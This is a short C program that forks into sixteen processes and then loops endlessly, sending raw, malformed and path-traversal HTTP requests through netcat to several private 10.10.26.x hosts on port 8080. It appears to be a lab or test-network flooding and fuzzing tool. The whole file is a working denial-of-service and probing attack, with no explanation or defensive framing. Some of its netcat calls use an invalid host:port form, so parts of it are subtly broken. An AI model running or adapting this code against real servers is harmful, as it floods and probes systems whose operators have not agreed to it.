#include <stdio.h>
#include <stdbool.h>
#include <stdlib.h>
#include <sys/types.h> 
#include <unistd.h> 

int main()
{
    fork();
    fork();
    fork();
    fork();
    while(true)
    {
        system("echo -en 'GET / HTTP/1.0\r\n\r\n' | nc 10.10.26.50 8080");
        system("echo -en 'MUSH\r\n\r\n' | nc 10.10.26.50:8080");
        system("echo -en 'MUSH /stuff HTTP/1.0\r\n\r\n' | nc 10.10.26.50 8080");
        system("echo -en 'GET ../../ HTTP/1.0\r\n\r\n' | nc 10.10.26.50 8080"); 
        system("echo -en 'GET / HTTP/1.0' | nc 10.10.26.50 8080");

         system("echo -en 'GET / HTTP/1.0\r\n\r\n' | nc 10.10.26.99 8080");
        system("echo -en 'MUSH\r\n\r\n' | nc 10.10.26.99:8080");
        system("echo -en 'MUSH /stuff HTTP/1.0\r\n\r\n' | nc 10.10.26.99 8080");
        system("echo -en 'GET ../../ HTTP/1.0\r\n\r\n' | nc 10.10.26.99 8080"); 
        system("echo -en 'GET / HTTP/1.0' | nc 10.10.26.99 8080");
         system("echo -en 'GET / HTTP/1.0\r\n\r\n' | nc 10.10.26.71 8080");
        system("echo -en 'MUSH\r\n\r\n' | nc 10.10.26.71:8080");
        system("echo -en 'MUSH /stuff HTTP/1.0\r\n\r\n' | nc 10.10.26.71 8080");
        system("echo -en 'GET ../../ HTTP/1.0\r\n\r\n' | nc 10.10.26.71 8080"); 
        system("echo -en 'GET / HTTP/1.0' | nc 10.10.26.1 8080");
         system("echo -en 'GET / HTTP/1.0\r\n\r\n' | nc 10.10.26.1 8080");
        system("echo -en 'MUSH\r\n\r\n' | nc 10.10.26.50:8080");
        system("echo -en 'MUSH /stuff HTTP/1.0\r\n\r\n' | nc 10.10.26.50 8080");
        system("echo -en 'GET ../../ HTTP/1.0\r\n\r\n' | nc 10.10.26.50 8080"); 
        system("echo -en 'GET / HTTP/1.0' | nc 10.10.26.50 8080");
    }
}